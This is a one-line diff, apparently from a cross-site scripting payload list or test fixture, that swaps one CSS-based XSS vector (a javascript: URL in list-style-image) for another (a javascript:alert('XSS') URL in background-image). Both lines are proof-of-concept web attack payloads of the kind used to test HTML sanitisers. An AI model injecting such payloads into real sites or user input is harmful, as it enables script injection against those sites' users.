@@ -1,1 +1,1 @@
-<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE>
